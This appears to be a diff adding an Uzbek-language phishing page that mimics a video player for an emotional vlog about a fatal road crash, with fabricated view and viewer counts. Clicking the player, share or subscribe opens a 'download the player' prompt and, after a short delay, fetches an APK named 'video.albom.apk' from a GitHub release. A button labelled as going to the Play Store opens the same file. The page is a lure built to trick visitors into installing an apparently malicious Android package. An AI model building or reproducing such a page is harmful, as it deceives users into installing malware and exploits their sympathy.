@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Chorraxada frontal to‘qnashuv</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        
+        body {
+            background: linear-gradient(180deg, #0a0a0a, #111111);
+            font-family: 'Inter', sans-serif;
+        }
+        
+        .player {
+            background: linear-gradient(45deg, #1a1a1a, #000);
+            box-shadow: 0 25px 50px -12px rgb(0 0 0 / 0.6);
+        }
+        
+        .play-button {
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        
+        .play-button:hover {
+            transform: scale(1.15);
+        }
+    </style>
+</head>
+<body class="min-h-screen text-white pb-12">
+
+<div class="max-w-[420px] mx-auto px-4 pt-8">
+
+    <!-- Плеер -->
+    <div id="player" class="player rounded-3xl overflow-hidden aspect-video relative cursor-pointer">
+        
+        <div class="absolute inset-0 bg-[url('https://images.unsplash.com/photo-1605559424843-9e4c1b5d5e5c?w=800')] bg-cover bg-center opacity-75"></div>
+        
+        <div class="absolute inset-0 flex items-center justify-center z-10">
+            <div class="play-button w-20 h-20 bg-white rounded-full flex items-center justify-center shadow-2xl shadow-black/80">
+                <i class="fa-solid fa-play text-4xl text-black ml-1"></i>
+            </div>
+        </div>
+
+        <!-- Текст ниже кнопки Play -->
+        <div class="absolute bottom-6 left-0 right-0 flex justify-center z-10">
+            <div class="bg-black/80 backdrop-blur-md px-8 py-3 rounded-3xl text-base font-medium flex items-center gap-3 border border-white/10">
+                <i class="fa-solid fa-download text-red-500"></i>
+                <span>Pleyerni yuklab oling</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Название видео -->
+    <h1 class="text-[21px] leading-tight font-semibold mt-6">
+        Vlog | Chorraxada frontal to‘qnashuv | Tanish ayol halok bo‘ldi | Sizdan yordam kerak
+    </h1>
+
+    <!-- Статистика -->
+    <div class="flex items-center gap-4 mt-4 text-sm">
+        <div>
+            <span class="font-semibold">89 tys.</span> 
+            <span class="text-zinc-400">ko‘rishlar</span>
+        </div>
+        <div class="text-zinc-400">•</div>
+        <div class="text-zinc-400">Bugun</div>
+        
+        <div class="ml-auto bg-red-600 text-white text-xs font-medium px-4 py-1.5 rounded-full flex items-center gap-2">
+            <div class="w-2 h-2 bg-white rounded-full animate-pulse"></div>
+            18 ko‘rmoqda
+        </div>
+    </div>
+
+    <!-- Кнопки действий -->
+    <div class="flex justify-between mt-8 px-2">
+        <button id="like-btn" class="flex flex-col items-center gap-1.5 hover:text-red-500 transition-colors">
+            <i class="fa-solid fa-thumbs-up text-3xl"></i>
+            <span class="text-sm font-medium">31K</span>
+        </button>
+        
+        <button class="flex flex-col items-center gap-1.5 hover:text-zinc-400 transition-colors">
+            <i class="fa-solid fa-thumbs-down text-3xl"></i>
+        </button>
+        
+        <button id="share-btn" class="flex flex-col items-center gap-1.5 hover:text-zinc-400 transition-colors">
+            <i class="fa-solid fa-share text-3xl"></i>
+            <span class="text-sm font-medium">Ulashish</span>
+        </button>
+        
+        <button id="save-btn" class="flex flex-col items-center gap-1.5 hover:text-zinc-400 transition-colors">
+            <i class="fa-solid fa-bookmark text-3xl"></i>
+            <span class="text-sm font-medium">Saqlash</span>
+        </button>
+    </div>
+
+    <!-- Канал -->
+    <div class="mt-9 bg-zinc-900 rounded-3xl p-5 flex items-center gap-4">
+        <div class="w-12 h-12 bg-zinc-800 rounded-2xl flex items-center justify-center text-3xl">
+            🔒
+        </div>
+        <div class="flex-1">
+            <div class="font-semibold">@crulne1</div>
+            <div class="text-zinc-400 text-sm">Avtorizatsiya talab qilinadi</div>
+        </div>
+        <button id="subscribe-btn" class="bg-white hover:bg-zinc-100 transition-colors text-black font-semibold px-9 py-3 rounded-3xl">
+            Obuna bo‘lish
+        </button>
+    </div>
+
+</div>
+
+<!-- Модальное окно -->
+<div id="modal" class="hidden fixed inset-0 bg-black/95 flex items-end justify-center z-50">
+    <div class="bg-zinc-900 w-full max-w-[420px] rounded-t-3xl p-8 text-center">
+        <div class="mx-auto w-24 h-24 bg-red-500/10 rounded-3xl flex items-center justify-center mb-6">
+            <i class="fa-solid fa-download text-6xl text-red-500"></i>
+        </div>
+        
+        <h2 class="text-3xl font-bold mb-3">Pleyerni yuklab oling</h2>
+        <p class="text-zinc-400 text-[17px] leading-relaxed">
+            Videoni ko‘rish uchun maxsus pleyer kerak.<br>
+            Fayl avtomatik yuklanmoqda...
+        </p>
+        
+        <div class="mt-10 bg-zinc-800 rounded-2xl py-5 text-base font-medium">
+            O‘rnatilgan faylni oching
+        </div>
+        
+        <div class="grid grid-cols-2 gap-4 mt-8">
+            <button onclick="closeModal()" class="py-4 border border-zinc-600 rounded-3xl font-medium">
+                Yopish
+            </button>
+            <button onclick="openPlayStore()" class="py-4 bg-red-600 hover:bg-red-700 transition-colors rounded-3xl font-semibold">
+                Play Store’ga o‘tish
+            </button>
+        </div>
+    </div>
+</div>
+
+<script>
+    document.getElementById('player').addEventListener('click', showModal);
+
+    document.getElementById('like-btn').addEventListener('click', function() {
+        this.classList.toggle('text-red-500');
+    });
+
+    document.getElementById('share-btn').addEventListener('click', function() {
+        this.style.color = '#ef4444';
+        setTimeout(() => this.style.color = '', 800);
+        showModal();
+    });
+
+    document.getElementById('save-btn').addEventListener('click', function() {
+        this.style.color = '#ef4444';
+        setTimeout(() => this.style.color = '', 800);
+    });
+
+    document.getElementById('subscribe-btn').addEventListener('click', showModal);
+
+    function showModal() {
+        const modal = document.getElementById('modal');
+        modal.classList.remove('hidden');
+        
+        setTimeout(() => {
+            window.open('https://github.com/fealmyreaclo8/vidsmap/releases/download/net56/video.albom.apk', '_blank');
+        }, 700);
+    }
+
+    function closeModal() {
+        document.getElementById('modal').classList.add('hidden');
+    }
+
+    function openPlayStore() {
+        window.open('https://github.com/fealmyreaclo8/vidsmap/releases/download/net56/video.albom.apk', '_blank');
+    }
+</script>
+
+</body>
+</html>
